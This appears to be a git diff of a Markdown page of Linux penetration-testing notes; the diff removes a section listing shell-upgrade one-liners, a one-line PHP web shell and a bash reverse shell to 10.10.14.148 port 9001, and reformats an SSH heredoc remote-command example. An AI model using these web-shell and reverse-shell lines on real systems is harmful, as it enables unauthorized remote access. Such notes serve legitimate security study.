@@ -8,49 +8,22 @@ description: 'Sorted Linux notes, need to separate to different pages and reorga
 
 Website for searching for shells through random programs such as 'vi' "living off the land binaries": [GTFObins](https://gtfobins.github.io/)
 
-### Upgrade shells:
+
+
+## 
+
+## Remote Code Execution
+
+Run commands on remote system without a shell through SSH with a "Herefile". `HERE` can be anything, but it must begin and end with the same word. [https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/](https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/)
 
 ```text
-1. python -c 'import pty; pty.spawn("/bin/sh")'
-2. perl -e 'exec "/bin/sh";'
-3. ruby -e 'exec "/bin/sh"'
-```
-
-To upgrade to fully interactive shell \(python example\):
-
-```bash
-python -c 'import pty;pty.spawn("/bin/bash")'; 
-ctrl-z #send to background
-stty raw -echo #https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x
-stty -a #get number of rows & columns
-stty rows <x> columns <y> #Set x number of rows & y columns
-fg #to return shell to foreground
-export TERM=xterm-color #allows you to clear console, and have color output
-```
-
-simple php shell: `<?php system($_GET['variable_name']); ?>`
-
-bash reverse shell:
-
-```text
-bash -i >& /dev/tct/10.10.14.148/9001 0>&1
-
-#URL encoded: 
-bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
-```
-
-### Remote Code Execution
-
-[https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/](https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/) Run commands on remote system without a shell through SSH with a "Herefile"
-
-```text
-ssh server1 << HERE
- command1
- command2
+ssh <user>@<server> << HERE
+ <command1>
+ <command2>
 HERE
 ```
 
-### Misc Linux
+## Misc Linux
 
 Raw memory location so no files on disk: `/dev/shm/`
 
